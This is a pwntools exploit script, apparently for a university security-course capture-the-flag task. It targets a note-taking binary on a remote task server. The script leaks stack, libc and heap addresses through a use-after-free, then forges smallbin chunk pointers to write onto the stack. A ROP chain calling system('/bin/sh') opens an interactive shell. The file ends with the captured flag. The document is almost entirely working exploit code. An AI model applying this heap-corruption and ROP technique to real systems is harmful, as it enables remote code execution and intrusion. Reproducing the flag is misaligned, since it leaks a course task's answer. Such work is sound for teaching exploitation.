from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
#b *read_index+55
#b *main+138
#b _int_malloc:3902
#b *_int_malloc+1071
b *main+578
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 32861)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/unsorted") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)

def add(index, note):
    # note_size is 256
    p.sendlineafter(b"> ", b"A")
    p.sendlineafter(b"Enter note index: ", f"{index}".encode())
    p.sendlineafter(b"Enter note: ", note)


def remove(index):
    p.sendlineafter(b"> ", b"D")
    # use after free
    p.sendlineafter(b"Enter note index: ", f"{index}".encode())


def edit(index, note):
    p.sendlineafter(b"> ", b"E")
    # edit a free chunk
    p.sendlineafter(b"Enter note index: ", f"{index}".encode())
    p.sendlineafter(b"Enter note: ", note)


def show(index, lines=1):
    p.sendlineafter(b"> ", b"S")
    p.sendlineafter(b"Enter note index: ", f"{index}".encode())
    p.recvuntil(f"Note {index}: ".encode())
    content = p.recvline()
    for i in range(lines-1):
        content += p.recvline()
    return content


def end():
    p.sendlineafter(b"> ", b"X")


p.recvuntil(b"This may be helpful: ")
stack_leak = int(p.recvline(), 16) - 0x40
print("stack leak: ", hex(stack_leak))


add(0, b"test")
#add(1, b"prevent merge")
add(2, b"to be edited note")
#remove(2)
remove(0)

libc_leak = int(show(0)[:6][::-1].hex(), 16)
print("libc leak: ", hex(libc_leak))

add(3, b"")
add(4, b"")
add(5, b"")
add(6, b"")
remove(5)
remove(3)

heap_leak = int(show(3)[:6][::-1].hex(), 16) - 0x330
print("heap leak: ", hex(heap_leak))

#edit(0, p64(0x10))

#input("~~~ magic ~~~> ")

# spaces do not work, but 0es do!
edit("0"*1024 + "2", b"hopefully went through unsorted bins and moved freed 0 entry into smallbins")

#index with 1024 spaces before actual number to cause alloc in scanf???







# in main() we can write a 24 byte long command on the stack, where we know the address of


# We turn this:
#chunk 1:
#  fd: heap_leak + 0x330
#  bk: libc_leak + 0x100
#
#chunk 2:
#  fd: libc_leak + 0x100
#  bk: heap_leak
#
#
# into this:
#chunk 1:
#  fd: stack_leak + ???
#  bk: libc_leak + 0x100
#
#chunk_fake:
#  fd: heap_leak + 0x330
#  bk: heap_leak
#
#chunk 2:
#  fd: libc_leak + 0x100
#  bk: stack_leak + ???

edit(3, p64(stack_leak-9)+p64(libc_leak+0x100))
edit(5, p64(libc_leak+0x100)+p64(stack_leak-9))


size = 0x110
#                command A  |padding | fd ptr               | bk ptr
p.sendlineafter(b"> ", b"A" + b" "*6 + p64(heap_leak+0x330))
p.sendlineafter(b"Enter note index: ", b"8")
p.sendlineafter(b"Enter note: ", b"")

# Now we are left with:
#chunk 1:
#  fd: stack_leak + ???
#  bk: libc_leak + 0x100
#
#chunk_fake:
#  fd: libc_leak + 0x100
#  bk: heap_leak

p.sendlineafter(b"> ", b"A" + b" "*6 + p64(libc_leak+0x100) + p64(heap_leak))
p.sendlineafter(b"Enter note index: ", b"9")
p.sendlineafter(b"Enter note: ", b"")



# Now we can write on the stack by editing entry 9!


libc_addr = libc_leak - 0x1d2cc0

libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(pack(rop.ret.address))
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload = rop.chain()


edit(9, b" "*9 + b"A"*cyclic_find_bytes(0x6161616f) + payload)
end()

p.interactive()

#softsec{sFPb3L4mIBLEL8AEitRi8FnXOxgTx66nHVkIZu--VtxGLI6Ry4gpdAa53aXoS0_d}